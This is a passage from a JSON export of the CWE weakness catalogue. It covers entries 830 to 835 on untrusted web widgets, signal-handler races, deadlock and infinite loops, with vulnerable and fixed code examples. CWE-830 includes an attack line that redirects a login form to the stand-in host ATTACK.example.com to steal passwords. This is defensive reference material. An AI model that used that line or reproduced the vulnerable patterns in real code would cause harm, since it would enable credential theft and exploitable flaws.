          "Link": "https://www.cve.org/CVERecord?id=CVE-2005-1869"
        },
        {
          "Reference": "CVE-2005-1870",
          "Description": "PHP file inclusion.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2005-1870"
        },
        {
          "Reference": "CVE-2005-2154",
          "Description": "PHP local file inclusion.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2005-2154"
        },
        {
          "Reference": "CVE-2002-1704",
          "Description": "PHP remote file include.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2002-1704"
        },
        {
          "Reference": "CVE-2002-1707",
          "Description": "PHP remote file include.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2002-1707"
        },
        {
          "Reference": "CVE-2005-1964",
          "Description": "PHP remote file include.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2005-1964"
        },
        {
          "Reference": "CVE-2005-1681",
          "Description": "PHP remote file include.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2005-1681"
        },
        {
          "Reference": "CVE-2005-2086",
          "Description": "PHP remote file include.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2005-2086"
        },
        {
          "Reference": "CVE-2004-0127",
          "Description": "Directory traversal vulnerability in PHP include statement.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2004-0127"
        },
        {
          "Reference": "CVE-2005-1971",
          "Description": "Directory traversal vulnerability in PHP include statement.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2005-1971"
        },
        {
          "Reference": "CVE-2005-3335",
          "Description": "PHP file inclusion issue, both remote and local; local include uses \"..\" and \"%00\" characters as a manipulation, but many remote file inclusion issues probably have this vector.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2005-3335"
        }
      ],
      "RelatedAttackPatterns": [
        "175",
        "201",
        "228",
        "251",
        "252",
        "253",
        "263",
        "538",
        "549",
        "640",
        "660",
        "695",
        "698"
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-45",
          "Authors": [
            "OWASP"
          ],
          "Title": "OWASP Enterprise Security API (ESAPI) Project",
          "URL": "http://www.owasp.org/index.php/ESAPI"
        },
        {
          "ExternalReferenceID": "REF-76",
          "Authors": [
            "Sean Barnum",
            "Michael Gegick"
          ],
          "Title": "Least Privilege",
          "PublicationYear": "2005",
          "PublicationMonth": "09",
          "PublicationDay": "14",
          "URL": "https://web.archive.org/web/20211209014121/https://www.cisa.gov/uscert/bsi/articles/knowledge/principles/least-privilege",
          "URLDate": "2023-04-07"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "830",
      "Name": "Inclusion of Web Functionality from an Untrusted Source",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product includes web functionality (such as a web widget) from another domain, which causes it to operate within the domain of the product, potentially granting total access and control of the product to the untrusted source.",
      "ExtendedDescription": "\n\nIncluding third party functionality in a web-based environment is risky, especially if the source of the functionality is untrusted.\n\n\nEven if the third party is a trusted source, the product may still be exposed to attacks and malicious behavior if that trusted source is compromised, or if the code is modified in transmission from the third party to the product.\n\n\nThis weakness is common in \"mashup\" development on the web, which may include source functionality from other domains. For example, Javascript-based web widgets may be inserted by using '<SCRIPT SRC=\"http://other.domain.here\">' tags, which causes the code to run in the domain of the product, not the remote site from which the widget was loaded. As a result, the included code has access to the local DOM, including cookies and other data that the developer might not want the remote site to be able to access.\n\n\nSuch dependencies may be desirable, or even required, but sometimes programmers are not aware that a dependency exists.\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "829",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation",
          "Note": "REALIZATION: This weakness is caused during implementation of an architectural security tactic."
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Confidentiality",
            "Integrity",
            "Availability"
          ],
          "Impact": [
            "Execute Unauthorized Code or Commands"
          ]
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-94",
          "Entries": [
            {
              "IntroText": "This login webpage includes a weather widget from an external website:"
            },
            {
              "Nature": "Bad",
              "Language": "HTML",
              "ExampleCode": "```\n\t<div class=\"header\"> Welcome!\n\t\t<div id=\"loginBox\">Please Login:\n\t\t\t<form id =\"loginForm\" name=\"loginForm\" action=\"login.php\" method=\"post\">\n\t\t\tUsername: <input type=\"text\" name=\"username\" />\n\t\t\t<br/>\n\t\t\tPassword: <input type=\"password\" name=\"password\" />\n\t\t\t<input type=\"submit\" value=\"Login\" />\n\t\t\t</form>\n\t\t</div>\n\t\t<div id=\"WeatherWidget\">\n\t\t\t<script type=\"text/javascript\" src=\"externalDomain.example.com/weatherwidget.js\"></script>\n\t\t</div>\n\t</div>\n```"
            },
            {
              "BodyText": "This webpage is now only as secure as the external domain it is including functionality from. If an attacker compromised the external domain and could add malicious scripts to the weatherwidget.js file, the attacker would have complete control, as seen in any XSS weakness (CWE-79)."
            },
            {
              "BodyText": "For example, user login information could easily be stolen with a single line added to weatherwidget.js:"
            },
            {
              "Nature": "Attack",
              "Language": "JavaScript",
              "ExampleCode": "```\n```\n...Weather widget code....* \n\tdocument.getElementById('loginForm').action = \"ATTACK.example.com/stealPassword.php\";"
            },
            {
              "BodyText": "This line of javascript changes the login form's original action target from the original website to an attack site. As a result, if a user attempts to login their username and password will be sent directly to the attack site."
            }
          ]
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-778",
          "Authors": [
            "Jeremiah Grossman"
          ],
          "Title": "Third-Party Web Widget Security FAQ",
          "URL": "https://blog.jeremiahgrossman.com/2010/07/third-party-web-widget-security-faq.html",
          "URLDate": "2023-04-07"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "831",
      "Name": "Signal Handler Function Associated with Multiple Signals",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product defines a function that is used as a handler for more than one signal.",
      "ExtendedDescription": "\n\nWhile sometimes intentional and safe, when the same function is used to handle multiple signals, a race condition could occur if the function uses any state outside of its local declaration, such as global variables or non-reentrant functions, or has any side effects.\n\n\nAn attacker could send one signal that invokes the handler function; in many OSes, this will typically prevent the same signal from invoking the handler again, at least until the handler function has completed execution. However, the attacker could then send a different signal that is associated with the same handler function. This could interrupt the original handler function while it is still executing. If there is shared state, then the state could be corrupted. This can lead to a variety of potential consequences depending on context, including denial of service and code execution.\n\n\nAnother rarely-explored possibility arises when the signal handler is only designed to be executed once (if at all). By sending multiple signals, an attacker could invoke the function more than once. This may generate extra, unintended side effects. A race condition might not even be necessary; the attacker could send one signal, wait until it is handled, then send the other signal.\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "364",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Availability",
            "Integrity",
            "Confidentiality",
            "Access Control",
            "Other"
          ],
          "Impact": [
            "DoS: Crash, Exit, or Restart",
            "Execute Unauthorized Code or Commands",
            "Read Application Data",
            "Gain Privileges or Assume Identity",
            "Bypass Protection Mechanism",
            "Varies by Context"
          ],
          "Note": "The most common consequence will be a corruption of the state of the product, possibly leading to a crash or exit. However, if the signal handler is operating on state variables for security relevant libraries or protection mechanisms, the consequences can be far more severe, including protection mechanism bypass, privilege escalation, or information exposure."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "This code registers the same signal handler function with two different signals."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tvoid handler (int sigNum) {\n\t\t...\n\t}\n\tint main (int argc, char* argv[]) {\n\t\tsignal(SIGUSR1, handler)\n\t\tsignal(SIGUSR2, handler)\n\t}\n```"
            }
          ]
        },
        {
          "ID": "DX-26",
          "Entries": [
            {
              "IntroText": "This code registers the same signal handler function with two different signals (CWE-831). If those signals are sent to the process, the handler creates a log message (specified in the first argument to the program) and exits."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tchar *logMessage;\n\tvoid handler (int sigNum) {\n\t\t\tsyslog(LOG_NOTICE, \"%s\\n\", logMessage);\n\t\t\tfree(logMessage);\n```\n/* artificially increase the size of the timing window to make demonstration of this weakness easier. */* \n\t\t\t\n\t\t\tsleep(10);\n\t\t\texit(0);}\n\t\n\tint main (int argc, char* argv[]) {\n\t```\n\t\t\tlogMessage = strdup(argv[1]);\n```\n/* Register signal handlers. */* \n\t\t\t\n\t\t\tsignal(SIGHUP, handler);\n\t\t\tsignal(SIGTERM, handler);\n\t\t\t\n\t\t\t */* artificially increase the size of the timing window to make demonstration of this weakness easier. */* \n\t\t\t\n\t\t\tsleep(10);}"
            },
            {
              "BodyText": "The handler function uses global state (globalVar and logMessage), and it can be called by both the SIGHUP and SIGTERM signals. An attack scenario might follow these lines:"
            },
            {
              "BodyText": "- The program begins execution, initializes logMessage, and registers the signal handlers for SIGHUP and SIGTERM.\n\n  - The program begins its \"normal\" functionality, which is simplified as sleep(), but could be any functionality that consumes some time.\n\n  - The attacker sends SIGHUP, which invokes handler (call this \"SIGHUP-handler\").\n\n  - SIGHUP-handler begins to execute, calling syslog().\n\n  - syslog() calls malloc(), which is non-reentrant. malloc() begins to modify metadata to manage the heap.\n\n  - The attacker then sends SIGTERM.\n\n  - SIGHUP-handler is interrupted, but syslog's malloc call is still executing and has not finished modifying its metadata.\n\n  - The SIGTERM handler is invoked.\n\n  - SIGTERM-handler records the log message using syslog(), then frees the logMessage variable."
            },
            {
              "BodyText": "At this point, the state of the heap is uncertain, because malloc is still modifying the metadata for the heap; the metadata might be in an inconsistent state. The SIGTERM-handler call to free() is assuming that the metadata is inconsistent, possibly causing it to write data to the wrong location while managing the heap. The result is memory corruption, which could lead to a crash or even code execution, depending on the circumstances under which the code is running."
            },
            {
              "BodyText": "Note that this is an adaptation of a classic example as originally presented by Michal Zalewski [REF-360]; the original example was shown to be exploitable for code execution."
            },
            {
              "BodyText": "Also note that the strdup(argv[1]) call contains a potential buffer over-read (CWE-126) if the program is called without any arguments, because argc would be 0, and argv[1] would point outside the bounds of the array."
            }
          ]
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-360",
          "Authors": [
            "Michal Zalewski"
          ],
          "Title": "Delivering Signals for Fun and Profit",
          "URL": "https://lcamtuf.coredump.cx/signals.txt",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-361",
          "Title": "Race Condition: Signal Handling",
          "URL": "https://vulncat.fortify.com/en/detail?id=desc.structural.cpp.race_condition_signal_handling#:~:text=Signal%20handling%20race%20conditions%20can,installed%20to%20handle%20multiple%20signals.s",
          "URLDate": "2023-04-07"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "832",
      "Name": "Unlock of a Resource that is not Locked",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product attempts to unlock a resource that is not locked.",
      "ExtendedDescription": "Depending on the locking functionality, an unlock of a non-locked resource might cause memory corruption or other modification to the resource (or its associated metadata that is used for tracking locks).",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "667",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Integrity",
            "Confidentiality",
            "Availability",
            "Other"
          ],
          "Impact": [
            "DoS: Crash, Exit, or Restart",
            "Execute Unauthorized Code or Commands",
            "Modify Memory",
            "Other"
          ],
          "Note": "Depending on the locking being used, an unlock operation might not have any adverse effects. When effects exist, the most common consequence will be a corruption of the state of the product, possibly leading to a crash or exit; depending on the implementation of the unlocking, memory corruption or code execution could occur."
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2010-4210",
          "Description": "function in OS kernel unlocks a mutex that was not previously locked, causing a panic or overwrite of arbitrary memory.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2010-4210"
        },
        {
          "Reference": "CVE-2008-4302",
          "Description": "Chain: OS kernel does not properly handle a failure of a function call (CWE-755), leading to an unlock of a resource that was not locked (CWE-832), with resultant crash.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-4302"
        },
        {
          "Reference": "CVE-2009-1243",
          "Description": "OS kernel performs an unlock in some incorrect circumstances, leading to panic.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-1243"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "833",
      "Name": "Deadlock",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product contains multiple threads or executable segments that are waiting for each other to release a necessary lock, resulting in deadlock.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "667",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "662",
          "ViewID": "1305",
          "Ordinal": "Primary"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Availability"
          ],
          "Impact": [
            "DoS: Resource Consumption (CPU)",
            "DoS: Resource Consumption (Other)",
            "DoS: Crash, Exit, or Restart"
          ],
          "Note": "Each thread of execution will \"hang\" and prevent tasks from completing. In some cases, CPU consumption may occur if a lock check occurs in a tight loop."
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-1999-1476",
          "Description": "A bug in some Intel Pentium processors allow DoS (hang) via an invalid \"CMPXCHG8B\" instruction, causing a deadlock",
          "Link": "https://www.cve.org/CVERecord?id=CVE-1999-1476"
        },
        {
          "Reference": "CVE-2009-2857",
          "Description": "OS deadlock",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-2857"
        },
        {
          "Reference": "CVE-2009-1961",
          "Description": "OS deadlock involving 3 separate functions",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-1961"
        },
        {
          "Reference": "CVE-2009-2699",
          "Description": "deadlock in library",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-2699"
        },
        {
          "Reference": "CVE-2009-4272",
          "Description": "deadlock triggered by packets that force collisions in a routing table",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-4272"
        },
        {
          "Reference": "CVE-2002-1850",
          "Description": "read/write deadlock between web server and script",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2002-1850"
        },
        {
          "Reference": "CVE-2004-0174",
          "Description": "web server deadlock involving multiple listening connections",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2004-0174"
        },
        {
          "Reference": "CVE-2009-1388",
          "Description": "multiple simultaneous calls to the same function trigger deadlock.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-1388"
        },
        {
          "Reference": "CVE-2006-5158",
          "Description": "chain: other weakness leads to NULL pointer dereference (CWE-476) or deadlock (CWE-833).",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2006-5158"
        },
        {
          "Reference": "CVE-2006-4342",
          "Description": "deadlock when an operation is performed on a resource while it is being removed.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2006-4342"
        },
        {
          "Reference": "CVE-2006-2374",
          "Description": "Deadlock in device driver triggered by using file handle of a related device.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2006-2374"
        },
        {
          "Reference": "CVE-2006-2275",
          "Description": "Deadlock when large number of small messages cannot be processed quickly enough.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2006-2275"
        },
        {
          "Reference": "CVE-2005-3847",
          "Description": "OS kernel has deadlock triggered by a signal during a core dump.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2005-3847"
        },
        {
          "Reference": "CVE-2005-3106",
          "Description": "Race condition leads to deadlock.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2005-3106"
        },
        {
          "Reference": "CVE-2005-2456",
          "Description": "Chain: array index error (CWE-129) leads to deadlock (CWE-833)",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2005-2456"
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "The CERT Oracle Secure Coding Standard for Java (2011)",
          "EntryID": "LCK08-J",
          "EntryName": "Ensure actively held locks are released on exceptional conditions"
        }
      ],
      "RelatedAttackPatterns": [
        "25"
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-62",
          "Section": "Chapter 13, \"Synchronization Problems\", section \"Starvation and Deadlocks\", Page 760",
          "Authors": [
            "Mark Dowd",
            "John McDonald",
            "Justin Schuh"
          ],
          "Title": "The Art of Software Security Assessment",
          "Edition": "1st Edition",
          "PublicationYear": "2006",
          "Publisher": "Addison Wesley"
        },
        {
          "ExternalReferenceID": "REF-783",
          "Section": "Chapter 7, \"Concurrency\", section \"Mutual Exclusion and Deadlock\", Page 248",
          "Authors": [
            "Robert C. Seacord"
          ],
          "Title": "Secure Coding in C and C++",
          "PublicationYear": "2006",
          "Publisher": "Addison Wesley"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "834",
      "Name": "Excessive Iteration",
      "Abstraction": "Class",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product performs an iteration or loop without sufficiently limiting the number of times that the loop is executed.",
      "ExtendedDescription": "If the iteration can be influenced by an attacker, this weakness could allow attackers to consume excessive resources such as CPU or memory. In many cases, a loop does not need to be infinite in order to cause enough resource consumption to adversely affect the product or its host system; it depends on the amount of resources consumed per iteration.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "691",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Availability"
          ],
          "Impact": [
            "DoS: Resource Consumption (CPU)",
            "DoS: Resource Consumption (Memory)",
            "DoS: Amplification",
            "DoS: Crash, Exit, or Restart"
          ],
          "Note": "Excessive looping will cause unexpected consumption of resources, such as CPU cycles or memory. The product's operation may slow down, or cause a long time to respond. If limited resources such as memory are consumed for each iteration, the loop may eventually cause a crash or program exit due to exhaustion of resources, such as an out-of-memory error."
        }
      ],
      "DetectionMethods": [
        {
          "Method": "Dynamic Analysis with Manual Results Interpretation",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tCost effective for partial coverage:\n```\n\n\t\tFuzz Tester\n\t\tFramework-based Fuzzer\n\t\tForced Path Execution",
          "Effectiveness": "SOAR Partial"
        },
        {
          "Method": "Manual Static Analysis - Source Code",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tCost effective for partial coverage:\n```\n\n\t\tFocused Manual Spotcheck - Focused manual analysis of source\n\t\tManual Source Code Review (not inspections)",
          "Effectiveness": "SOAR Partial"
        },
        {
          "Method": "Automated Static Analysis - Source Code",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tHighly cost effective:\n```\n\n\t\tContext-configured Source Code Weakness Analyzer",
          "Effectiveness": "High"
        },
        {
          "Method": "Architecture or Design Review",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tHighly cost effective:\n```\n\n\t\tInspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)",
          "Effectiveness": "High"
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-204",
          "Entries": [
            {
              "IntroText": "In this example a mistake exists in the code where the exit condition contained in flg is never called. This results in the function calling itself over and over again until the stack is exhausted."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "void do_something_recursive (int flg)\n {\n\n```\n\t ... // Do some real work here, but the value of flg is unmodified\n\t if (flg) { do_something_recursive (flg); } // flg is never modified so it is always TRUE - this call will continue until the stack explodes\n }\n int flag = 1; // Set to TRUE\n do_something_recursive (flag);\n```"
            },
            {
              "BodyText": "Note that the only difference between the Good and Bad examples is that the recursion flag will change value and cause the recursive call to return."
            },
            {
              "Nature": "Good",
              "Language": "C",
              "ExampleCode": "void do_something_recursive (int flg)\n {\n\n```\n\t ... // Do some real work here\n\t // Modify value of flg on done condition\n\t if (flg) { do_something_recursive (flg); } // returns when flg changes to 0\n }\n int flag = 1; // Set to TRUE\n do_something_recursive (flag);\n```"
            }
          ]
        },
        {
          "ID": "DX-205",
          "Entries": [
            {
              "IntroText": "For this example, the method isReorderNeeded is part of a bookstore application that determines if a particular book needs to be reordered based on the current inventory count and the rate at which the book is being sold."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tpublic boolean isReorderNeeded(String bookISBN, int rateSold) {\n\t\t\tboolean isReorder = false;\n\t\t\tint minimumCount = 10;\n\t\t\tint days = 0;\n```\n// get inventory count for book* \n\t\t\tint inventoryCount = inventory.getIventoryCount(bookISBN);\n\t\t\t\n\t\t\t\n\t\t\t *// find number of days until inventory count reaches minimum* \n\t\t\twhile (inventoryCount > minimumCount) {\n\t\t\t```\n\t\t\t\t\tinventoryCount = inventoryCount - rateSold;\n\t\t\t\t\tdays++;\n\t\t\t}\n```\n// if number of days within reorder timeframe* \n\t\t\t\n\t\t\t\n\t\t\t *// set reorder return boolean to true* \n\t\t\tif (days > 0 && days < 5) {\n\t\t\t```\n\t\t\t\tisReorder = true;\n\t\t\t}\n\t\t\treturn isReorder;\n\t}\n```"
            },
            {
              "BodyText": "However, the while loop will become an infinite loop if the rateSold input parameter has a value of zero since the inventoryCount will never fall below the minimumCount. In this case the input parameter should be validated to ensure that a value of zero does not cause an infinite loop, as in the following code."
            },
            {
              "Nature": "Good",
              "Language": "Java",
              "ExampleCode": "```\n\tpublic boolean isReorderNeeded(String bookISBN, int rateSold) {\n\t\t\t...\n```\n// validate rateSold variable* \n\t\t\tif (rateSold < 1) {\n\t\t\t```\n\t\t\t\treturn isReorder;\n\t\t\t}\n\t\t\t...\n\t}\n```"
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2011-1027",
          "Description": "Chain: off-by-one error (CWE-193) leads to infinite loop (CWE-835) using invalid hex-encoded characters.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2011-1027"
        },
        {
          "Reference": "CVE-2006-6499",
          "Description": "Chain: web browser crashes due to infinite loop - \"bad looping logic [that relies on] floating point math [CWE-1339] to exit the loop [CWE-835]\"",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2006-6499"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-62",
          "Section": "Chapter 7, \"Looping Constructs\", Page 327",
          "Authors": [
            "Mark Dowd",
            "John McDonald",
            "Justin Schuh"
          ],
          "Title": "The Art of Software Security Assessment",
          "Edition": "1st Edition",
          "PublicationYear": "2006",
          "Publisher": "Addison Wesley"
        }
      ],
      "MappingNotes": {
        "Usage": "Discouraged",
        "Rationale": "This CWE entry is a level-1 Class (i.e., a child of a Pillar). It might have lower-level children that would be more appropriate",
        "Comments": "Examine children of this entry to see if there is a better fit",
        "Reasons": [
          "Abstraction"
        ]
      }
    },
    {
      "ID": "835",
      "Name": "Loop with Unreachable Exit Condition ('Infinite Loop')",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product contains an iteration or loop with an exit condition that cannot be reached, i.e., an infinite loop.",
      "ExtendedDescription": "If the loop can be influenced by an attacker, this weakness could allow attackers to consume excessive resources such as CPU or memory.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "834",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "834",
          "ViewID": "1003",
          "Ordinal": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Availability"
          ],
          "Impact": [
            "DoS: Resource Consumption (CPU)",
            "DoS: Resource Consumption (Memory)",
            "DoS: Amplification"
          ],
          "Note": "An infinite loop will cause unexpected consumption of resources, such as CPU cycles or memory. The software's operation may slow down, or cause a long time to respond."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "In the following code the method processMessagesFromServer attempts to establish a connection to a server and read and process messages from the server. The method uses a do/while loop to continue trying to establish the connection to the server when an attempt fails."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tint processMessagesFromServer(char *hostaddr, int port) {\n\t\t\t...\n\t\t\tint servsock;\n\t\t\tint connected;\n\t\t\tstruct sockaddr_in servaddr;\n```\n// create socket to connect to server* \n\t\t\tservsock = socket( AF_INET, SOCK_STREAM, 0);\n\t\t\tmemset( &servaddr, 0, sizeof(servaddr));\n\t\t\tservaddr.sin_family = AF_INET;\n\t\t\tservaddr.sin_port = htons(port);\n\t\t\tservaddr.sin_addr.s_addr = inet_addr(hostaddr);\n\t\t\t\n\t\t\tdo {\n\t\t\t```\n```\n// establish connection to server* \n\t\t\t\t\tconnected = connect(servsock, (struct sockaddr *)&servaddr, sizeof(servaddr));\n\t\t\t\t\t\n\t\t\t\t\t\n\t\t\t\t\t *// if connected then read and process messages from server* \n\t\t\t\t\tif (connected > -1) {\n\t\t\t\t\t```\n```\n// read and process messages* \n\t\t\t\t\t\t\t...}\n\t\t\t\t\t\n\t\t\t\n\t\t\t *// keep trying to establish connection to the server* \n\t\t\t} while (connected < 0);\n\t\t\t\n\t\t\t\n\t\t\t *// close socket and return success or failure* \n\t\t\t...}"
            },
            {
              "BodyText": "However, this will create an infinite loop if the server does not respond. This infinite loop will consume system resources and can be used to create a denial of service attack. To resolve this a counter should be used to limit the number of attempts to establish a connection to the server, as in the following code."
            },
            {
              "Nature": "Good",
              "Language": "C",
              "ExampleCode": "```\n\tint processMessagesFromServer(char *hostaddr, int port) {\n\t\t\t...\n```\n// initialize number of attempts counter* \n\t\t\tint count = 0;\n\t\t\tdo {\n\t\t\t```\n```\n// establish connection to server* \n\t\t\t\t\tconnected = connect(servsock, (struct sockaddr *)&servaddr, sizeof(servaddr));\n\t\t\t\t\t\n\t\t\t\t\t\n\t\t\t\t\t *// increment counter* \n\t\t\t\t\tcount++;\n\t\t\t\t\t\n\t\t\t\t\t\n\t\t\t\t\t *// if connected then read and process messages from server* \n\t\t\t\t\tif (connected > -1) {\n\t\t\t\t\t```\n```\n// read and process messages* \n\t\t\t\t\t\t\t...}\n\t\t\t\t\t\n\t\t\t\n\t\t\t *// keep trying to establish connection to the server* \n\t\t\t\n\t\t\t\n\t\t\t *// up to a maximum number of attempts* \n\t\t\t} while (connected < 0 && count < MAX_ATTEMPTS);\n\t\t\t\n\t\t\t\n\t\t\t *// close socket and return success or failure* \n\t\t\t...}"
            }
          ]
        },
        {
          "ID": "DX-205",
          "Entries": [
            {
              "IntroText": "For this example, the method isReorderNeeded is part of a bookstore application that determines if a particular book needs to be reordered based on the current inventory count and the rate at which the book is being sold."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tpublic boolean isReorderNeeded(String bookISBN, int rateSold) {\n\t\t\tboolean isReorder = false;\n\t\t\tint minimumCount = 10;\n\t\t\tint days = 0;\n```\n// get inventory count for book* \n\t\t\tint inventoryCount = inventory.getIventoryCount(bookISBN);\n\t\t\t\n\t\t\t\n\t\t\t *// find number of days until inventory count reaches minimum* \n\t\t\twhile (inventoryCount > minimumCount) {\n\t\t\t```\n\t\t\t\t\tinventoryCount = inventoryCount - rateSold;\n\t\t\t\t\tdays++;\n\t\t\t}\n```\n// if number of days within reorder timeframe* \n\t\t\t\n\t\t\t\n\t\t\t *// set reorder return boolean to true* \n\t\t\tif (days > 0 && days < 5) {\n\t\t\t```\n\t\t\t\tisReorder = true;\n\t\t\t}\n\t\t\treturn isReorder;\n\t}\n```"
            },
            {
              "BodyText": "However, the while loop will become an infinite loop if the rateSold input parameter has a value of zero since the inventoryCount will never fall below the minimumCount. In this case the input parameter should be validated to ensure that a value of zero does not cause an infinite loop, as in the following code."
            },
            {
              "Nature": "Good",
              "Language": "Java",
              "ExampleCode": "```\n\tpublic boolean isReorderNeeded(String bookISBN, int rateSold) {\n\t\t\t...\n```\n// validate rateSold variable* \n\t\t\tif (rateSold < 1) {\n\t\t\t```\n\t\t\t\treturn isReorder;\n\t\t\t}\n\t\t\t...\n\t}\n```"
            }
